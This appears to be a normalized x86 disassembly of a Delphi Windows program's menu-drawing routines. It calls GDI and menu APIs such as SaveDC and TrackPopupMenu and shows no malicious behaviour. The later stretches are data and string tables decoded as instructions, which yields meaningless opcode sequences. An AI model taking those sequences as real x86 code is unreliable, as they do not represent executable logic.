mov dx [ esi + 0x4 ]
call sub_450434
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d734
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45140a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4513ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41ddac
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41dc4c
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45187c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4513f4
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41ddac
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_450c94
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_450394
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413f44
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_450394
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_45154d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d734
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_451528
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45150b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41ddac
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41dc4c
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451512
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41ddac
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_43a030
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d44c
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413f44
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_450394
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413f44
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_450394
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413f44
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413f44
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_450394
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413f44
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413f44
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_4503c4
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413f44
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413f44
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_4503c4
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_45d0f0
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_45d158
jmp r-xdata
sub_45152f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_4515e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_413de8
pop esi
pop ebx
retn
push ebx
push sub_451058
call sub_41ab78
mov [ ebx + 0x10 ] eax
sub_45162c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4501ac
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_4515e8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_4516a0
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_451610
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_4516f8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_44c544
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_450eb4
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_450eb4
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_451740
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_44c544
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bc9c
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403454
mov edx eax
jmp r-xdata
sub_45178c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_412ae8
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_4516f8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_44fb00
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_44fffc
mov eax [ ebx + 0x34 ]
call sub_44d3a4
mov eax ebx
call sub_4509a4
mov eax ebx
call sub_451740
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_44d4d4
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_451840
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413f44
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413f44
cmp ebp [ eax ]
jne r-xdata
sub_45187c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41d5e4
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41ce18
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41d5e4
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41ce18
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403454
mov edx [ r-xdata ]
call sub_4033e4
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41d5e4
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41ce18
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_451964
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403ffc
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_404268
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404508
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_404268
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404508
jmp r-xdata
sub_4519f8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403fa8
mov ebx 0x1
mov eax esi
call sub_404268
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404190
sub_451a5c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_451ab5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_451964
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_451964
mov eax [ ebp - 0x8 ]
pop edx
call sub_407e18
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451abc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
sub_451ac4
adc al [ eax ]
add [ eax ] al
test al 0x2c
inc edi
add [ eax + 0x3c ] cl
inc edi
add [ esp + ebp + 0x3be40047 ] ah
inc edi
add [ eax + 0x7c00472c ] ah
cmp eax [ edi ]
pushfd
sub al 0x47
add al cl
cmp eax [ edi ]
cwde
sub al 0x47
add [ edi + edi + 0x2c940047 ] ch
inc edi
add al dl
cmp eax [ edi ]
nop
sub al 0x47
add ah al
cmp eax 0x2c8c0047
inc edi
add [ eax ] dl
cmp eax 0x2c880047
inc edi
add [ eax + eax * 2 + 0x47 ] dl
add [ esp + ebp + 0x40500047 ] al
inc edi
add [ eax - 0x5fffb8d4 ] al
cmp al 0x47
add [ esp + ebp + 0x47 ] bh
add ah bh
aas
inc edi
add [ eax + 0x2c ] bh
inc edi
add [ edi + edi + 0x2c740047 ] dh
inc edi
add [ eax + eax * 2 + 0x2c700047 ] bh
inc edi
add [ eax + eax * 2 + 0x47 ] bh
add [ esp + ebp + 0x47 ] ch
add [ esp + edi + 0x2c680047 ] dh
inc edi
add ah cl
cmp al 0x47
add [ esp + ebp + 0x47 ] ah
add [ eax ] dh
cmp eax 0x8b550047
in al dx
xor eax eax
push ebp
push sub_451bbc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451bc3
retn
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
call sub_403fa8
sub_451bc8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_451ac4
call sub_403d54
mov eax [ r-xdata ]
call sub_413780
mov eax [ r-xdata ]
call sub_413820
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4137cc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4137cc
mov eax [ r-xdata ]
call sub_4136c4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4244b4
mov [ rw-data ] eax
sub_451d96
fdivr [ edi ]
inc ebp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
dec [ eax + ecx * 2 + 0x48a00045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
add [ eax ] al
[ 0x1ff0000 ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
inc [ eax ]
dec eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
inc esp
dec eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
[ eax + ecx * 2 + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
push ebx
insd
outsd
outsd
je r-xdata
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
jmp [ edi + eax * 2 ]
add [ esp + esi - 0x650fffc0 ] ch
inc ecx
add [ esp + esi + 0x12800040 ] dh
inc esp
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + ebx ] al
inc ebp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
inc edx
inc esp
add [ eax + 0xa ] cl
inc esp
add [ eax ] al
inc ebp
inc ecx
add ah bl
out dx eax
inc ebx
add al dh
retn
dec esi
outsd
jb r-xdata
add [ eax ] ah
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
inc ecx
add [ esi + ebx * 4 - 0x616bffbf ] bl
inc ecx
add [ ecx + 0x4ad80041 ] bh
inc ebp
add [ edi + 0x42500044 ] dh
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax - 0x2fffbbc9 ] dh
aaa
inc esp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
lodsb [ esi ]
dec eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax ] cl
pop ds
inc ebp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x4b ] dl
inc ebp
rcr [ eax + 0x451f ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
and [ ebp ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
and [ ebp ] al
xchg edx eax
and [ ebp ] al
sbb al 0x2
add [ eax ] al
lodsb [ esi ]
mov [ ebx ] es
pushfd
mov eax [ 0x34ac0041 ]
inc eax
add al dh
0x34b40041 0x40
adc [ edx ] 0x44
sub_452574
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x26
inc ebp
add [ eax + ebp + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
inc ebp
add [ edx + 0x28 ] al
inc ebp
add al bh
add al [ eax ]
add [ edi + ebx + 0x45 ] cl
add [ ecx + 0x54940041 ] bl
inc ebp
add [ eax + 0x56 ] cl
inc ebp
add [ esp + esi + 0x7ab40040 ] dh
inc ebp
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x20004556 ] dh
inc edx
inc esp
add [ eax ] ah
pop esp
inc ebp
add [ eax ] al
inc ebp
inc ecx
add [ eax + 0x58 ] dh
inc ebp
add [ eax + ebx * 2 + 0x59b80045 ] ch
inc ebp
add [ eax ] cl
int 0x43
add [ ecx + 0x62300041 ] dh
inc ebp
add [ esi + ebx * 4 - 0x622fffbf ] dl
inc ebp
add [ eax ] cl
push ebx
inc ebp
add [ edi + 0x42500044 ] dh
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax + 0x10004437 ] dh
pop edi
inc ebp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ eax ] al
inc ebp
add al bl
int1
inc ebx
add al dh
int3
sub_452878
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr [ ecx ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp + 0x2f80045 ] dh
add [ eax ] al
jo r-xdata
add [ eax ] ah
pop esp
inc ebp
add [ eax ] al
inc ebp
inc ecx
add [ eax + 0x58 ] dh
inc ebp
add [ eax + ebx * 2 + 0x59b80045 ] ch
inc ebp
add [ eax ] cl
int 0x43
add [ ecx + 0x62300041 ] dh
inc ebp
add [ esi + ebx * 4 - 0x622fffbf ] dl
inc ebp
add [ eax ] cl
push ebx
inc ebp
add [ edi + 0x42500044 ] dh
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax + 0x10004437 ] dh
pop edi
inc ebp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ eax ] al
inc ebp
add al bl
int1
inc ebx
add al dh
int3
inc ebp
add [ ecx + 0x54940041 ] bl
inc ebp
add [ eax + 0x56 ] cl
inc ebp
add [ esp + esi + 0x7ab40040 ] dh
inc ebp
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x20004556 ] dh
inc edx
inc esp
sub_452b4d
push 0x45
add [ eax + 0x456d ] bl
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
popad
outsb
test al 0xb0
inc ecx
add [ eax ] dh
add bh bh
rcl al 0x43
add ah bl
rol [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
add eax 0x6f6c6f43
jb r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ ecx + ecx * 8 ] ah
inc ebx
add ah ch
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
je r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
call 0x69442c2a
lahf
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
pushad
inc ebp
add [ esi + ebx * 2 + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
insb
in al dx
insb
pop eax
mov eax [ ebx ]
insb
add [ eax ] eax
[ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
outsb
mov ah 0x7b
inc ebx
and eax [ ebp ]
xor [ edx ] eax
add bh bh
xor [ edx ] eax
add bh bh
cwde
insd
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x6300ffff ] ah
cmp [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
add [ eax ] al
dec eax
outsb
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
jpo r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
outsd
outsb
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
mov [ ebp + 0x43 ] bh
add [ eax + eax ] dh
push esp
inc ebx
add [ ecx ] al
add [ eax ] al
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
in al 0x22
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
cmp al 0x7c
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
or eax [ ebx + 0x6c ]
jae r-xdata
mov al 0x41
add ah ch
add al [ eax ]
call [ edi + ebx * 4 + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
adc [ eax ] al
pop ecx
add [ eax ] al
dec [ eax + edx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
cmp [ eax + eax + 0x6c ] al
cmp [ eax + eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x48ff0001 ] ah
imul esp [ gs : edi + 0x68 ] 0x40109474
outsb
je r-xdata
dec ecx
imul ebp [ ebp + 0x1c ] 0x800451d
add al [ eax ]
call [ ebp + ecx * 2 + 0x6d980045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
cmp al 0x10
outsd
outsb
je r-xdata
inc esp
add [ eax + 0x2 ] ah
jb r-xdata
